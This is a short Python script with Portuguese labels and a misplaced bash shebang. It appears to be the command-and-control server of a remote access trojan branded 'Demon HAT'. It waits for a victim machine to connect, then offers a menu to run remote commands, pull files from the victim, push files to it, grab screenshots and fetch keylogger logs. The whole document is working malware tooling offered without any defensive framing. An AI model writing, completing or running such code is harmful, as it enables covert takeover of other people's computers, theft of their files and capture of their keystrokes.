#!/bin/bash

import socket
import random

verde = "\033[1;32m"
vermelho = "\033[1;31m"
reset = "\033[0;0m"

HOST = input("Seu IP:") 
PORT = int(input("Porta: "))

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1) 
print(f"{verde}[Servidor]: {HOST} {PORT} {reset}")

conn, addr = s.accept() 
print(f"[+] Conectado por {addr}\n")

menu = f"""
 {verde} ====            =====Demon[ MENU DE COMANDOS ]Hat======            ====
[1] Executar comando remoto
                                       [2] Download de arquivo
 [3] Upload de arquivo 
                                                   [4] Capturar Tela 
[5] keylogger
                         [0] Sair

[Os hackers sao os Magos da era digital]========[Conhecimento nao e crime] {reset}
"""

while True: 
  print(menu) 
  escolha = input(f"{vermelho}[Demon@HAT]: {reset}")

  if escolha == '1':
    cmd = input("Comando> ")
    conn.send(cmd.encode())
    result = conn.recv(100000).decode(errors="ignore")
    print("\n" + result + "\n")

  elif escolha == '2':
    path = input("Caminho do arquivo na vítima: ")
    conn.send(f"download {path}".encode())
    data = conn.recv(1000000)
    nome = input("Salvar como (nome local): ")
    with open(nome, "wb") as f:
        f.write(data)
    print("[+] Arquivo salvo.")

  elif escolha == '3':
    filename = input("Nome do arquivo local: ")
    conn.send(f"upload {filename}".encode())
    with open(filename, "rb") as f:
        conn.send(f.read())
    resp = conn.recv(1024)
    print(resp.decode())

  elif escolha == '4':
    conn.send(b"screenshot")
    data = conn.recv(1000000)
    with open("screenshot.png", "wb") as f:
        f.write(data)
    print("[+] Screenshot salva como screenshot.png")

  elif escolha == '5':
    conn.send(b"keylog")
    data = conn.recv(100000)
    print("\n[ KEYLOGGER LOG ]\n" + data.decode(errors="ignore") + "\n")

  elif escolha == '0':
    conn.send(b"exit")
    break

  else:
    print("Opção inválida.")

conn.close() 
s.close()

